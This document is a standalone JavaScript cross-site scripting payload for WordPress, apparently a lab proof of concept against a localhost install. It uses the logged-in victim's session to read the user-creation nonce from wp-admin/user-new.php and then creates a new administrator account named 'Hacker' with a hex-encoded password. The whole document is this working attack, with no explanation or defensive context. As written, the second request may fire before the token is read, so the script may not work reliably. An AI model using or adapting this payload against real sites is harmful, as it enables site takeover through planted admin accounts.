    <script>

        let url = "http://localhost/xss/wp-admin/user-new.php"
        function getToken(){
        let xhr = new XMLHttpRequest();
        xhr.open("POST", url, true );
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        xhr.send();
        xhr.onreadystatechange = function() {//Call a function when the state changes.
        if(xhr.readyState == 4 && xhr.status == 200) {
            parser=new DOMParser();
            xmlDoc=parser.parseFromString(xhr.responseText,"text/xml");
            wpnonce = xmlDoc.getElementById("_wpnonce_create-user").value;
            }
        }
    }
        
        function addAdmin(){
        let xhr = new XMLHttpRequest();
        xhr.open("POST", url ,true );
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        xhr.send(`action=createuser&_wpnonce_create-user=${wpnonce}&_wp_http_referer=%2Fxss%2Fwp-admin%2Fuser-new.php&user_login=Hacker&email=Maroonx@gmial.com&first_name=Maroon&last_name=x&url=test&pass1=%48%61%63%6b%65%64&pass2=%48%61%63%6b%65%64&send_user_notification=1&role=administrator&createuser=Add+New+User`);
        }
        getToken();
        addAdmin();

    </script>
